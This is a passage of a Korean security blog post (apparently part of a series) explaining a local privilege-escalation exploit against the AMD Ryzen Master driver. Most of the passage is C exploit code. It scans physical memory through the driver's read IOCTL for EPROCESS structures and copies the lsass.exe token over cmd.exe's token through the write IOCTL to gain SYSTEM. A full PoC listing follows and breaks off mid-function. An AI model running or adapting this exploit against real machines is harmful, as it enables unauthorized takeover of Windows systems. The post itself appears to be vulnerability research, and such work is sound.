&#xBAA8;&#xB450; &#xAE30;&#xB85D;&#xD558;&#xAE30; &#xC704;&#xD574; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC120;&#xC5B8;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 proc_address[<span class="hljs-number">300</span>];    INT64 page_entry_offset[<span class="hljs-number">300</span>];    INT64 header_size[<span class="hljs-number">300</span>];    INT64 proc_count;} PROC_DATA;</code></pre><p><br></p><p>&#xC774;&#xC81C; &#xC11C;&#xCE6D;&#xD560; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774; &#xBC94;&#xC704;&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB098; (&#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xACBD;&#xC6B0;) &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xD06C;&#xAE30; &#xB4F1;&#xC5D0; &#xB530;&#xB77C; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC544; &#xC11C;&#xCE6D;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xAC00; &#xD06C;&#xAC8C; &#xCC28;&#xC774;&#xAC00; &#xB098;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xAC8C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC81C; &#xACBD;&#xC6B0;&#xB294; &#xD638;&#xC2A4;&#xD2B8; PC 16GB, VM&#xC5D0; 4GB&#xB97C; &#xD560;&#xB2F9;&#xD588;&#xC73C;&#xBA70; <code>0x120000000</code> ~ <code>0x240000000</code> &#xBC94;&#xC704;&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME         <span class="hljs-meta-string">&quot;\\\\\\\\.\\\\AMDRyzenMasterDriverV15&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE_IOCTL         (DWORD)0x81112F0C</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ_IOCTL          (DWORD)0x81112F08</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> START_ADDRESS       (INT64)0x100000000</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STOP_ADDRESS        (INT64)0x240000000</span>...<span class="hljs-function">PROC_DATA <span class="hljs-title">read_memory</span><span class="hljs-params">(HANDLE dHandle)</span></span><span class="hljs-function"></span>{    DWORD dwRet;    PROC_DATA proc_data = { <span class="hljs-number">0</span>, };        DWORD len = <span class="hljs-number">0x1000</span>;    INT64 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);        <span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\\n&quot;</span>);            <span class="hljs-keyword">return</span> proc_data;        }        READ_INPUT_BUFFER input_buff = { read_address, len };        LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);               DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>);                INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        <span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) {            PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);            INT32 proc_val = *(PINT32)proc_ptr;            <span class="hljs-keyword">if</span> (proc_val == <span class="hljs-number">0x636f7250</span>) {                <span class="hljs-keyword">for</span> (INT64 k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0xA0</span>; k += <span class="hljs-number">0x10</span>) {                    PINT64 header_ptr = (PINT64)(result + j + k);                    INT32 header_val = *(PINT32)header_ptr;                    <span class="hljs-keyword">if</span> (header_val == <span class="hljs-number">0x00000003</span>) {                        INT64 tmp = read_address + j;                        INT64 modulus = tmp % <span class="hljs-number">0x1000</span>;                        proc_data.page_entry_offset[proc_data.proc_count] = modulus;                        proc_data.proc_address[proc_data.proc_count] = tmp - modulus;                        proc_data.header_size[proc_data.proc_count] = k;                        proc_data.proc_count++;                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Proc chunks found\\n&quot;</span>, proc_data.proc_count);                                           }                }                            }        }        i++;    }}...</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; <code>0x120000000</code> ~ <code>0x240000000</code> &#xC0AC;&#xC774; Proc &#xD0DC;&#xADF8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xBAA8;&#xB450; &#xCC3E;&#xB294; &#xB8E8;&#xD2F4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><br></p><pre><code class="hljs c">INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);<span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\\n&quot;</span>);<span class="hljs-keyword">return</span> proc_data;}</code></pre><p>&#xC77D;&#xC744; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; <code>0x120000000</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574; Page &#xD06C;&#xAE30;&#xC778; <code>0x1000</code> &#xB2E8;&#xC704;&#xB85C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xBA70; &#xC11C;&#xCE6D;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><br></p><pre><code class="hljs c">READ_INPUT_BUFFER input_buff = { read_address, len };LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);       DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>);INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code></pre><p><code>input_buff</code>&#xC5D0;&#xB294; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xAE38;&#xC774;(<code>0x1000</code>)&#xB97C; &#xC8FC;&#xACE0;, <code>output_buff</code>&#xC5D0; &#xCDA9;&#xBD84;&#xD55C; &#xACF5;&#xAC04;&#xC744; &#xD560;&#xB2F9;&#xD574; <code>DeviceIoControl</code> &#xD568;&#xC218;&#xB85C; <code>0x81112F08</code> IOCTL &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.  <code>0x81112F08</code> &#xC740; METHOD_BUFFERED &#xB85C; input&#xACFC; output &#xBC84;&#xD37C;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; IOCTL &#xACB0;&#xACFC; &#xBC84;&#xD37C;&#xC5D0; Input&#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>output_buff</code>&#xC5D0; <code>0xc</code> (<code>INT64 read_address(0x8) + DWORD len(0x4)</code>) &#xB9CC;&#xD07C; &#xB354;&#xD55C; &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC774; IOCTL &#xC694;&#xCCAD;&#xC758; &#xACB0;&#xACFC;&#xAC12;&#xC778; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xB418;&#xACE0; <code>result</code>&#xB85C; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><p><br></p><pre><code class="hljs c"><span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) { <span class="hljs-comment">// Searching Proc Tag</span>PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);INT32 proc_val = *(PINT32)proc_ptr<span class="hljs-keyword">if</span> (proc_val == <span class="hljs-number">0x636f7250</span>) { <span class="hljs-keyword">for</span> (INT64 k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0xA0</span>; k += <span class="hljs-number">0x10</span>) { <span class="hljs-comment">//Searching marker (0x00000003</span>PINT64 header_ptr = (PINT64)(result + j + k);INT32 header_val = *(PINT32)header_ptr;<span class="hljs-keyword">if</span> (header_val == <span class="hljs-number">0x00000003</span>) {<span class="hljs-comment">// save Proc chunk</span>INT64 tmp = read_address + j;INT64 modulus = tmp % <span class="hljs-number">0x1000</span>;proc_data.page_entry_offset[proc_data.proc_count] = modulus;proc_data.proc_address[proc_data.proc_count] = tmp - modulus;proc_data.header_size[proc_data.proc_count] = k;proc_data.proc_count++;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Proc chunks found\\n&quot;</span>, proc_data.proc_count);}}            }}</code></pre><p>&#xC6B0;&#xC120; <code>result</code>&#xC5D0;&#xC11C; <code>0x10</code> aligned &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; <code>+0x4</code> &#xC704;&#xCE58; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC774; <code>0x635f7250</code>(Proc)&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xBA74; &#xC774;&#xD6C4; <code>PROC_HEADER</code>&#xC758; &#xC608;&#xC0C1; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xC778; &#xC57D; <code>0xA0</code>&#xAE4C;&#xC9C0; <code>0x10</code> &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xD55C; &#xBC88; &#xB354; &#xB3CC;&#xBA74;&#xC11C; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xCC3E;&#xACE0;, &#xCC3E;&#xC73C;&#xBA74; &#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xAD6C;&#xD55C; Proc tag address &#xC640; page entry offset, header size&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAC12;&#xC73C;&#xB85C; &#xC774;&#xD6C4;&#xC5D0; &#xB2E4;&#xC2DC; <code>EPRCEOSS</code>&#xC758; &#xC704;&#xCE58;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><br></p><p>&#xC774;&#xC81C; &#xC800;&#xC7A5;&#xB41C; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xAC01; &#xBC30;&#xC5F4;&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xC758; &#xAC01; &#xD544;&#xB4DC;&#xAC12;(<code>ImageFileName</code>, <code>Token</code>, <code>UniqueProcessId</code>)&#xC744; &#xAD6C;&#xD558;&#xACE0; <code>cmd.exe</code>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xC8FC;&#xC18C;&#xC640; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xAC12;&#xC744; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_proc</span><span class="hljs-params">(PROC_DATA proc_data, HANDLE dHandle)</span> </span>{    DWORD bytes_ret = <span class="hljs-number">0</span>;    DWORD num_of_bytes = <span class="hljs-number">0x1000</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; proc_data.proc_count; i++) {        INT64 read_address = proc_data.proc_address[i];        READ_INPUT_BUFFER input_buff = { read_address, num_of_bytes };        DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);        INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        INT64 EPROCESS = result + proc_data.page_entry_offset[i] + proc_data.header_size[i];                INT64 imagename_address = EPROCESS + <span class="hljs-number">0x5a8</span>; <span class="hljs-comment">//ImageFileName</span>        INT64 imagename_value = *(PINT64)imagename_address;        INT64 proc_token_addr = EPROCESS + <span class="hljs-number">0x4b8</span>; <span class="hljs-comment">//Token</span>        INT64 proc_token = *(PINT64)proc_token_addr;        INT64 pid_addr = EPROCESS + <span class="hljs-number">0x440</span>; <span class="hljs-comment">//UniqueProcessId</span>        INT64 pid_value = *(PINT64)pid_addr;<span class="hljs-keyword">if</span>(imagename_value == <span class="hljs-number">0x78652e737361736c</span>) {  <span class="hljs-comment">//lsass.exe - system process</span>system_token_value = proc_token;}        <span class="hljs-keyword">if</span> (imagename_value == <span class="hljs-number">0x6578652e646d63</span>) {   <span class="hljs-comment">//cmd.exe - target process</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cmd.exe found!!\\n&quot;</span>);        cmd_token_addr = (read_address + proc_data.header_size[i] + proc_data.page_entry_offset[i] + <span class="hljs-number">0x4b8</span>);        }    }}</code></pre><p><code>proc_address &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; + page entry offset + header size</code> &#xAC00; <code>EPROCESS</code>&#xC758; &#xC704;&#xCE58;&#xAC00; &#xB418;&#xBA70; &#xC0AC;&#xC804;&#xC5D0; &#xAD6C;&#xD55C; <code>EPROCESS</code>&#xC758; &#xAC01; &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD574; <code>Token</code>&#xACFC; <code>ImageFileName</code>&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ImageFileName</code>&#xC774; <code>cmd.exe</code>&#xBA74; &#xD574;&#xB2F9; <code>EPROCESS</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4; <code>lsass.exe</code>&#xBA74; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><br></p><h2 id="Overwrite-Token"><a href="#Overwrite-Token" class="headerlink" title="Overwrite Token"></a>Overwrite Token</h2><p>&#xC774;&#xC81C; &#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD55C; &#xAC83; &#xCC98;&#xB7FC; <code>lsass.exe</code>&#xC758; <code>Token</code>&#xAC12;&#xC744; <code>cmd.exe</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC5D0; overwrite&#xD558;&#xBA74; <code>cmd.exe</code>&#xC758; &#xAD8C;&#xD55C;&#xC744; <code>NT AUTORITY\SYSTEM</code>&#xC73C;&#xB85C; &#xBC14;&#xAFD4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overwrite_token</span><span class="hljs-params">(HANDLE dHandle)</span> </span>{    DWORD modulus = cmd_token_addr % <span class="hljs-number">0x1000</span>;    INT64 cmd_page = cmd_token_addr - modulus;    DWORD bytes_ret = <span class="hljs-number">0x0</span>;    DWORD read_num_bytes = modulus;    PBYTE output_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0xc</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    READ_INPUT_BUFFER input_buff = { cmd_page, read_num_bytes };    DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, modulus + <span class="hljs-number">0xc</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);    PBYTE results = (PBYTE)((INT64)output_buff + <span class="hljs-number">0xc</span>);    PBYTE cmd_page_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0x8</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    DWORD num_of_bytes = modulus + <span class="hljs-number">0x8</span>;<span class="hljs-comment">// page pool ~ before token</span>    <span class="hljs-built_in">memcpy</span>(cmd_page_buff, results, modulus);<span class="hljs-comment">// new token value </span>    <span class="hljs-built_in">memcpy</span>(cmd_page_buff + modulus, (<span class="hljs-keyword">void</span>*)&amp;system_token_value, <span class="hljs-number">0x8</span>);    BYTE input_buff2[<span class="hljs-number">0x1000</span>] = { <span class="hljs-number">0</span>, };    <span class="hljs-built_in">memcpy</span>(input_buff2, (<span class="hljs-keyword">void</span>*)cmd_page, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0x8</span>, (<span class="hljs-keyword">void</span>*)&amp;num_of_bytes, <span class="hljs-number">0x4</span>);    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0xc</span>, cmd_page_buff, modulus + <span class="hljs-number">0x8</span>);    DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xc</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);}</code></pre><p>&#xC774;&#xB54C; &#xD55C; &#xAC00;&#xC9C0; &#xBB38;&#xC81C;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, Page &#xB2E8;&#xC704;&#xB85C; &#xB9E4;&#xD551;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; memory write&#xC758; &#xACBD;&#xC6B0; &#xC815;&#xD655;&#xD788; Token &#xAC12; 8 bytes&#xB9CC; overwrite&#xD560; &#xC218; &#xC5C6;&#xB2E4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xACB0;&#xBC95;&#xC740; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;! Page pool&#xC758; &#xC2DC;&#xC791;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC12;&#xB4E4;&#xC744; <code>READ_IOCTL</code>&#xB85C; &#xBAA8;&#xB450; &#xAC00;&#xC838;&#xC640; &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xC5D0; overwrite&#xD560; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xCD94;&#xAC00;&#xD55C; &#xBC84;&#xD37C;&#xB97C; <code>WRITE_IOCTL 0x81112F0C</code>&#xC744; &#xD1B5;&#xD574; input&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; Page pool &#xC2DC;&#xC791;&#xC8FC;&#xC18C;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xB294; exploit &#xC804;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xAC12;&#xC774; &#xC720;&#xC9C0;&#xB418;&#xACE0; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><br></p><p>&#xC774;&#xC81C; cmd&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xBE4C;&#xB4DC;&#xD55C; PoC&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;..</p><p><img src="/2021/08/11/l0ch/windows-driver-part4/3.gif" alt></p><p>&#xC775;&#xC2A4; &#xC131;&#xACF5;!</p><p><br></p><p>&#xC544;&#xB798;&#xB294; &#xC804;&#xCCB4; PoC&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME         <span class="hljs-meta-string">L&quot;\\\\.\\AMDRyzenMasterDriverV15&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE_IOCTL         (DWORD)0x81112F0C</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ_IOCTL          (DWORD)0x81112F08</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> START_ADDRESS       (INT64)0x120000000</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> END_OF_ADDRESS      (INT64)0x240000000</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 start_address;    DWORD num_of_bytes;    <span class="hljs-keyword">char</span> receiving_buff[<span class="hljs-number">0x1000</span>];} READ_INPUT_BUFFER;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 proc_address[<span class="hljs-number">300</span>];    INT64 page_entry_offset[<span class="hljs-number">300</span>];    INT64 header_size[<span class="hljs-number">300</span>];    INT64 proc_count;} PROC_DATA;INT64 cmd_token_addr = <span class="hljs-number">0</span>;INT64 system_token_value = <span class="hljs-number">0</span>;<span class="hljs-function">PROC_DATA <span class="hljs-title">read_memory</span><span class="hljs-params">(HANDLE dHandle)</span></span><span class="hljs-function"></span>{    DWORD dwRet;    PROC_DATA proc_data = { <span class="hljs-number">0</span>, };        DWORD len = <span class="hljs-number">0x1000</span>;    INT64 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);        <span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\n&quot;</span>);            <span class="hljs-keyword">return</span> proc_data;        }        READ_INPUT_BUFFER input_buff = { read_address, len };        <span class="hljs-comment">//printf(&quot;read address: %p\n&quot;,read_address);</span>        LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);               DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>);                INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        <span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) {            PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);            INT32 proc_val = *(PINT32)proc_ptr;            <span class="hljs-keyword">if</span> (proc_val == <span class="hljs-number">0x636f7250</span>) {                <span class="hljs-keyword">for</span> (INT64 k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0xA0</span>; k += <span class="hljs-number">0x10</span>) {                    PINT64 header_ptr = (PINT64)(result + j + k);                    INT32 header_val = *(PINT32)header_ptr;                    <span class="hljs-keyword">if</span> (header_val == <span class="hljs-number">0x00000003</span>) {                        INT64 tmp = read_address + j;                        INT64 modulus = tmp % <span class="hljs-number">0x1000</span>;                        proc_data.page_entry_offset[proc_data.proc_count] = modulus;                        proc_data.proc_address[proc_data.proc_count] = tmp - modulus;                        proc_data.header_size[proc_data.proc_count] = k;                        proc_data.proc_count++;                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%I64d] Proc found\n&quot;</span>, proc_data.proc_count);                    }                }                            }        }        i++;    }}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_proc</span><span class="hljs-params">(PROC_DATA proc_data, HANDLE dHandle)</span> </span>{    DWORD bytes_ret = <span class="hljs-number">0</span>;    DWORD num_of_bytes = <span class="hljs-number">0x1000</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; proc_data.proc_count; i++) {        INT64 read_address = proc_data.proc_address[i];        READ_INPUT_BUFFER input_buff = { read_address, num_of_bytes };        DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);        INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        INT64 EPROCESS = result + proc_data.page_entry_offset[i] + proc_data.header_size[i];                INT64 imagename_address = EPROCESS + <span class="hljs-number">0x5a8</span>; <span class="hljs-comment">//ImageFileName</span>        INT64 imagename_value = *(PINT64)imagename_address;        INT64 proc_token_addr = EPROCESS + <span class="hljs-number">0x4b8</span>; <span class="hljs-comment">//Token</span>        INT64 proc_token = *(PINT64)proc_token_addr;        INT64 pid_addr = EPROCESS + <span class="hljs-number">0x440</span>; <span class="hljs-comment">//UniqueProcessId</span>        INT64 pid_value = *(PINT64)pid_addr;        <span class="hljs-keyword">if</span> (imagename_value == <span class="hljs-number">0x78652e737361736c</span>) {  <span class="hljs-comment">//lsass.exe - system process</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] system process [%s] found\n&quot;</span>, (<span class="hljs-keyword">char</span>*)imagename_address);            system_token_value = proc_token;        }        <span class="hljs-keyword">if</span> (imagename_value == <span class="hljs-number">0x6578652e646d63</span>) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] [%s] found\n&quot;</span>, (<span class="hljs-keyword">char</span>*)imagename_address);            cmd_token_addr = (read_address + proc_data.header_size[i] + proc_data.page_entry_offset[i] + <span class="hljs-number">0x4b8</span>);        }    }}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overwrite_token</span><span class="hljs-params">(HANDLE dHandle)</span> </span>{    DWORD modulus = cmd_token_addr % <span class="hljs-number">0x1000</span>;    INT64 cmd_page = cmd_token_addr - modulus;    DWORD bytes_ret = <span class="hljs-number">0x0</span>;    DWORD read_num_bytes = modulus;    PBYTE output_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0xc</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    READ_INPUT_BUFFER input_buff = { cmd_page, read_num_bytes };    DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, modulus + <span class="hljs-number">0xc</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);    PBYTE results = (PBYTE)((INT64)output_buff + <span class="hljs-number">0xc</span>);    PBYTE cmd_page_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0x8</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span 